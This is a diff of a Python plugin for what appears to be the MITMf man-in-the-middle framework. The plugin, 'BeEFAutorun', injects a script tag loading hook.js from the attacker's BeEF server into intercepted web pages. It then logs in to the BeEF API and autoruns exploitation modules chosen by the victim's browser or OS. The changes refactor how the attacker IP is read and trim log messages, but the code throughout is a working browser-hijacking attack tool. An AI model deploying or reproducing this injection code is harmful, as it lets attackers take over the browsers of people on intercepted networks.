@@ -2,8 +2,6 @@ from plugins.plugin import Plugin
 from plugins.Inject import Inject
 from time import sleep
 import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
-from scapy.all import get_if_addr
 import sys
 import json
 import threading
@@ -12,15 +10,17 @@ import libs.beefapi as beefapi
 requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Connection (1)" log message
 requests_log.setLevel(logging.WARNING)
 
-
 class BeefAutorun(Inject, Plugin):
 	name     = "BeEFAutorun"
 	optname  = "beefauto"
-	has_opts = False
 	desc     = "Injects BeEF hooks & autoruns modules based on Browser and/or OS type"
+	depends  = ["Inject"]
+	req_root = False
+	has_opts = False
 
 	def initialize(self, options):
 		self.options = options
+		self.ip_address = options.ip_address
 
 		try:
 			beefconfig = options.configfile['MITMf']['BeEF']
@@ -36,24 +36,14 @@ class BeefAutorun(Inject, Plugin):
 		self.All_modules = userconfig["ALL"]
 		self.Targeted_modules = userconfig["targets"]
 
-		try:
-			self.ip_address = get_if_addr(options.interface)
-			if self.ip_address == "0.0.0.0":
-				sys.exit("[-] Interface %s does not have an IP address" % options.interface)
-		except Exception, e:
-			sys.exit("[-] Error retrieving interface IP address: %s" % e)
-
 		Inject.initialize(self, options)
 		self.black_ips = []
 		self.html_payload = '<script type="text/javascript" src="http://%s:%s/hook.js"></script>' % (self.ip_address, beefconfig['beefport'])
 		
 		beef = beefapi.BeefAPI({"host": beefconfig['beefip'], "port": beefconfig['beefport']})
-		if beef.login(beefconfig['user'], beefconfig['pass']):
-			print "[*] Successfully logged in to BeEF"
-		else:
+		if not beef.login(beefconfig['user'], beefconfig['pass']):
 			sys.exit("[-] Error logging in to BeEF!")
-		
-		print "[*] BeEFAutorun plugin online => Mode: %s" % self.Mode
+
 		t = threading.Thread(name="autorun", target=self.autorun, args=(beef,))
 		t.setDaemon(True)
 		t.start()
